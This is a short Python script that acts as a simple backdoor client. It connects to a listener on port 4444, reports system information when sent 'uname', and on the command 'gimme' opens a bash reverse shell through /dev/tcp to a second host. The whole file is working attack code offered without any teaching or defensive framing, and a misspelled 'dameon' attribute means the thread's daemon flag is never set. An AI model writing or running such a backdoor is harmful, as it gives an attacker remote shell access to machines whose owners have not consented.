#!/usr/bin/python3

import os
import threading
import multiprocessing
import socket

def rev_shell():
    os.system("bash -c \'bash -i >& /dev/tcp/0.0.0.0/1337 0>&1\'")

def connect():

    host = "127.0.0.1"
    port = 4444
    s = socket.create_connection((host,port))
    while True:
        data = s.recv(1024)
        if data.decode() == "uname\n":
            info = os.uname()
            s.send(str(info).encode())
        if data.decode() == "gimme":
            t = threading.Thread(target = rev_shell)
            t.dameon = True
            t.start()

connect()